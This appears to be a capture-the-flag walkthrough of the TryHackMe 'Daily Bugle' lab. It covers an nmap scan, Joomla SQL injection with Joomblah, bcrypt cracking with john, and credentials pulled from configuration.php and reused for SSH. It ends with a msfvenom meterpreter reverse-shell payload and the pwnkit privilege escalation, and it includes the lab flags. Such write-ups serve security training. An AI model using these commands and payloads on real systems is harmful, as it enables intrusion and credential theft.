@@ -1,0 +1,180 @@
+
+IP - 10.10.221.8
+
+nmap -sC -sV 10.10.221.8 -p- -oN nmap_All_ports.txt
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 16:31 +0630
+Nmap scan report for 10.10.221.8
+Host is up (0.22s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
+|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
+|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-title: Home
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+3306/tcp open  mysql   MariaDB (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+
+
+
+Access the web server, who robbed the bank?
+
+Spiderman
+
+
+Joomla 3.7.0
+
+
+https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
+
+
+I use this script with python version 2
+
+┌──(root㉿kali)-[~/Desktop/THM_Learning_Path/Offensive_Pentesting/daily_bugle]
+└─# ./joomblah.py http://10.10.221.8/
+                                                                                                                    
+    .---.    .-'''-.        .-'''-.                                                           
+    |   |   '   _    \     '   _    \                            .---.                        
+    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
+    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
+    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
+    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
+    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
+    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
+ __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
+|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
+|____.'                                                                `--'  `" '---'   '---' 
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+  -  Extracting sessions from fb9j5_session
+
+
+  ┌──(root㉿kali)-[~/Desktop/THM_Learning_Path/Offensive_Pentesting/daily_bugle]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt john_pass.txt     
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+spiderman123     (?)     
+1g 0:00:04:57 DONE (2022-12-25 18:11) 0.003364g/s 157.5p/s 157.5c/s 157.5C/s thelma1..speciala
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+
+bash-4.2$ cat configuration.php 
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'The Daily Bugle';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+
+        public $user = 'root';
+        public $password = 'nv5uz9r3ZEDzVjNu';
+
+        public $db = 'joomla';
+        public $dbprefix = 'fb9j5_';
+        public $live_site = '';
+
+        public $secret = 'UAMBRWzHO3oFPmVC';
+
+        public $gzip = '0';
+        public $error_reporting = 'default';
+        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+        public $ftp_host = '127.0.0.1';
+        public $ftp_port = '21';
+        public $ftp_user = '';
+        public $ftp_pass = '';
+        public $ftp_root = '';
+        public $ftp_enable = '0';
+        public $offset = 'UTC';
+        public $mailonline = '1';
+        public $mailer = 'mail';
+        public $mailfrom = 'jonah@tryhackme.com';
+        public $fromname = 'The Daily Bugle';
+        public $sendmail = '/usr/sbin/sendmail';
+        public $smtpauth = '0';
+        public $smtpuser = '';
+        public $smtppass = '';
+        public $smtphost = 'localhost';
+        public $smtpsecure = 'none';
+        public $smtpport = '25';
+        public $caching = '0';
+        public $cache_handler = 'file';
+        public $cachetime = '15';
+        public $cache_platformprefix = '0';
+        public $MetaDesc = 'New York City tabloid newspaper';
+        public $MetaKeys = '';
+        public $MetaTitle = '1';
+        public $MetaAuthor = '1';
+        public $MetaVersion = '0';
+        public $robots = '';
+        public $sef = '1';
+        public $sef_rewrite = '0';
+        public $sef_suffix = '0';
+        public $unicodeslugs = '0';
+        public $feed_limit = '10';
+        public $feed_email = 'none';
+        public $log_path = '/var/www/html/administrator/logs';
+        public $tmp_path = '/var/www/html/tmp';
+        public $lifetime = '15';
+        public $session_handler = 'database';
+        public $shared_session = '0';
+
+
+ssh username jjameson
+password - nv5uz9r3ZEDzVjNu
+
+[jjameson@dailybugle ~]$ cat user.txt 
+27a260fe3cba712cfdedb1c86d80442e
+
+
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.17.8.93 LPORT=4445 -f elf > reverse.elf
+
+
+use exploit/multi/handler
+
+set payload linux/x86/meterpreter/reverse_tcp
+
+and then use background
+
+use multi/recon/local_exploit_suggester
+
+target is vulnerable into linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+
+use linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+
+
+meterpreter > cat root.txt 
+eec3d53292b1821868266858d7fa6f79
+
+
+
+
